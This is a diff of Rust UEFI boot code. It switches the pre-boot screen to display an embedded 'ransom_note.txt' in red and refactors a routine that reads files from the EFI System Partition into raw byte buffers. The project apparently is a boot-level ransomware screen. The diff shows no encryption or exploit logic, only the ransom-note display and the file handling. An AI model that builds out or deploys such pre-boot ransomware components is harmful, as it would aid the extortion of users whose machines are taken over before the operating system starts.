@@ -5,10 +5,11 @@
 extern crate alloc;
 
 use core::fmt::Write;
+use alloc::boxed::Box;
 use uefi::prelude::*;
 use uefi::{Char16, Event, ResultExt};
 use uefi::proto::console::text::{Color, Key, Output};
-use alloc::string::{String, ToString};
+use alloc::string::{String};
 use core::alloc::Layout;
 use core::str;
 use uefi::exts::allocate_buffer;
@@ -19,41 +20,48 @@ fn init_screen(stdout: &mut Output) {
     stdout.clear().unwrap().unwrap();
     stdout.enable_cursor(true).unwrap_success();
     stdout.set_color(Color::Red, Color::Black).unwrap_success();
-    stdout.write_str(include_str!("text.txt")).unwrap();
+    stdout.write_str(include_str!("ransom_note.txt")).unwrap();
     stdout.write_str("\n> ").unwrap();
 }
 
-fn read_file(st: &SystemTable<Boot>, filename: &str) -> String {
+fn read_file(st: &SystemTable<Boot>, filename: &str) -> Result<Box<[u8]>, ()> {
+
+    // Get the file system protocol
     let fs = st
         .boot_services()
         .locate_protocol::<SimpleFileSystem>()
         .unwrap_success();
+    let fs = unsafe { &mut *fs.get() }; // Unsafe because we need to use the raw pointer
 
-    let fs = unsafe { &mut *fs.get() };
-    let mut root = fs.open_volume().unwrap().unwrap();
-    let text_file_handle = root
-        .open(filename, FileMode::Read, FileAttribute::empty())
-        .expect("Failed to load file")
-        .unwrap();
-    let mut text_file = match text_file_handle.into_type().unwrap().unwrap() {
+    // Open root directory of EFI System Partition
+    let mut root = fs.open_volume().unwrap_success();
+
+    // Get file handle
+    let text_file_handle = match root.open(filename, FileMode::Read, FileAttribute::empty()) {
+        Ok(file) => file.unwrap(),
+        _ => return Err(()), // File not found
+    };
+    let mut text_file = match text_file_handle.into_type().unwrap_success() {
         uefi::proto::media::file::FileType::Regular(f) => f,
-        uefi::proto::media::file::FileType::Dir(_) => panic!("Not expecting a directory"),
+        _ => return Err(()), // File is not a regular file
     };
 
+    // Read file size
     let mut buf = [0; 500];
-    let text_info: &mut FileInfo = text_file.get_info(&mut buf).unwrap().unwrap();
-    let text_size = usize::try_from(text_info.file_size()).unwrap();
+    let text_info: &mut FileInfo = text_file.get_info(&mut buf).unwrap_success();
+    let text_size = text_info.file_size() as usize;
 
+    // Allocate a buffer for the file contents with a proper alignment
     let buf_layout = Layout::array::<u8>(text_size).unwrap();
     let mut buf = allocate_buffer(buf_layout);
 
+    // Read file content into buffer
     text_file.read(&mut buf).unwrap_success();
 
+    // Close file handle
     text_file.close();
 
-    let text_content = str::from_utf8(&buf).unwrap();
-
-    return text_content.to_string();
+    Ok(buf)
 }
 
 fn take_input(system_table: &mut SystemTable<Boot>, char_16: Char16, buffer: &mut String) {
@@ -69,10 +77,18 @@ fn take_input(system_table: &mut SystemTable<Boot>, char_16: Char16, buffer: &mu
                 init_screen(stdout);
                 buffer.clear();
             } else if buffer == "test" {
-                let text_content = read_file(&st, "test.txt");
-
                 stdout.write_char('\n').unwrap();
-                stdout.write_str(&text_content).unwrap();
+
+                match read_file(&st, "test.txt") {
+                    Ok(buf) => {
+                        let content = str::from_utf8(&buf).unwrap();
+                        stdout.write_str(content).unwrap();
+                    },
+                    Err(_) => {
+                        stdout.write_str("File not found").unwrap();
+                    }
+                }
+
                 stdout.write_str("\n> ").unwrap();
                 buffer.clear();
             }
